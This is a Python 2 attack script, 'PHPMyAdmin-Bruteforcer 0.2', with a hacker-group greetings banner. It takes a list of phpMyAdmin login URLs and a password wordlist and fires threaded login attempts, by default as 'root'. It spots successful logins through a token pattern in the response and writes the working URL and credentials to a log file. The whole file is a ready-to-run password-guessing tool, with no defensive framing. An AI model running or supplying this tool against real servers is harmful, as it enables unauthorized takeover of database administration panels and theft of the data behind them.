#!/usr/bin/python
# -*- coding: utf-8 -*-
import argparse
import threading
import sys
import re
import urllib
import urllib2
import cookielib
import socket

banner= """
                         ®          ®
                           8       8
               $$            8   8            $$
                $??$????$     88     $????$??$
                  $?????$$$$  88  $$$$?????$
                    $?????$$$$88$$$$?????$
                    $$?????$ .888 .$?????$$
                      $$??? $$8jr8$$ ???$$
                        $??$  88  $??$
                      $$???$  88  $???$$
                       s$$?$  88  $?$$s
                        s$$        $$s
+--------------------------------------------------------------+
|                  PHPMyAdmin-Bruteforcer 0.2                  |
|                             ***                              |
| Greetz fly out to:                                           |
|  DDR, B2R, BWC, ECB, MLC                                     |
|  maro, coder, airy, fr0sty, syncop, tenti, Serengeti,        |
|  knusi, ische, Buster, smurfy, saint, peak                   |
|                               and all i foget :D             |
|                                                              |
|  special thanks to whyned for the threading pattern! ♥       |
|                                                              |
|                                             author: _bop     |
|                                             date: 15.03.2015 |
+--------------------------------------------------------------+
"""


class read_file():
    """
    Read File line per line
    """
    def __init__(self, file):
         try:
             self.file = open(file, "r+")
         except:
             print "[-] Error: Cant open File"

         self.actual_line = ""


    def next_line(self):
         """
         Moves the pointer to the next line and returns this
         """
         try:
             line = self.file.next().rstrip()
         except StopIteration:
             line = False

         except AttributeError:
             line = False

         self.actual_line = line
         return line

    def actual_line(self):
         """
         Returns actual line, doesnt moves the pointer
         """
         return self.actual_line


class brute():

    def __init__(self, user, wordlist, timeout, savefile_validlogin):
        try:
            self.words = open(wordlist, "r").readlines()
            self.user = user
            self.savefile_validlogin = savefile_validlogin
            socket.setdefaulttimeout(timeout)  # set timeout for all socket connection (including HTTP requests)
            if args.verbosity >= 1:
                print "[+] Info: words loaded: "+str(len(self.words))
                print "[+] Info: user: "+self.user
        except(IOError):
            print "[-] Error: check your wordlist path\n"
            sys.exit(1)

    def pma(self, url):

        try:
            found = re.search("http://.*\.php", url)
            url = str(found.group())
        except(AttributeError), msg:
            print "[-] invalide: "+url
            return False

        if args.verbosity >= 1:
            print "[-] Info: loaded url: "+url
        cookie_jar = cookielib.CookieJar()

        for word in self.words:
            word = word.replace("\r","").replace("\n","")
            login_form_seq = [
                ('pma_username', self.user),
                ('pma_password', word),
                ('server', '1'),
                ('submit', 'Go'),
                ('lang', 'en-utf-8'),
                ('convcharset', 'iso-8859-1')
            ]
            login_form_data = urllib.urlencode(login_form_seq)
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie_jar))

            try:
                  site = opener.open(url, login_form_data).read()
            except(urllib2.URLError), msg:
                  if args.verbosity >= 1:
                      print "[-] urllib2: "+msg
                  break

            if re.search("Cookies must be enabled past this point",site):
                  if args.verbosity >= 1:
                      print "[-] Failed: PhpMyAdmin has cookies enabled\n"
                  break

            #Change this response if different. (language)
            if re.search("<h1>Error</h1>",site) or re.search("Access denied",site) or re.search("Login without a password is forbidden", site) or re.search("Cannot log in to the MySQL server", site):
                  if args.verbosity == 2:
                      print "[-] Error: Login Failed: "+word
            #login success
            elif re.search("var token \= [\"\']?[\d\w]{32}[\'\"\ ]?\;", site):
                  if args.verbosity == 2:
                      print "\n\t[!] Login Successfull:"
                      print url
                      print "User: "+self.user
                      print "Password: "+word
                      print ""
                  elif args.verbosity == 1:
                      print "\n[!] Login Successfull: "+url+" ["+self.user+":"+word+"]\n"
                  else:
                      print "[!] Login Successfull: "+url+" ["+self.user+":"+word+"]"
                  
                  myFile = open(self.savefile_validlogin, "a")
                  myFile.write(url+"    ["+self.user+":"+word+"]\n")
                  myFile.close()
                  break
        return True


class main():
    """
    Main part which controls the complete program
    """
    def __init__(self, file, user, wordlist, timeout, savefile_validlogin):
        self.file = read_file(file)
        if args.verbosity >= 1:
            print "[+] Info: urls loaded: "+str(len(self.file))
        self.brute = brute(user, wordlist, timeout, savefile_validlogin)

    def run(self, threads):
        threads = int(threads)
        
        if args.verbosity >= 1:
            print "[~] Info: loaded threads: %s" %threads

        while True:
            line = self.file.next_line()
            if line == False:
                 break
            while True:
                if threading.active_count() <= threads:
                   t = threading.Thread(target=self.brute.pma, args=[line])
                   t.deamon = False
                   t.start()
                   break
        return True

if __name__ == "__main__":
    
    try:
        sys.argv[1]
        print banner
    except IndexError:
        pass
    
    parser = argparse.ArgumentParser()
    parser.add_argument("FILE", type=str, help="the file with the pma urls")
    parser.add_argument("WORDLIST", type=str, help="the wordlist file with the potential passwords")
    parser.add_argument("-u", "--user", help="the PMA user (default=root)", type=str, default="root")
    parser.add_argument("-t", "--threads", help="the threads of coincident bruteforce (default=5)", type=int, default=5)
    parser.add_argument("-T", "--timeout", help="the connection timeout (default=15)", type=int, default=15)
    default_output=sys.argv[0][:sys.argv[0].rfind(".")]+".log"
    parser.add_argument("-o", "--output", help="save the valid logins to output file (default="+default_output+")", type=str, default=default_output)
    parser.add_argument("-v", "--verbosity", type=int, choices=[0, 1, 2], help="increase output verbosity")
    args = parser.parse_args()
    
    main = main(args.FILE, args.user, args.WORDLIST, args.timeout, args.output)
    main.run(args.threads)

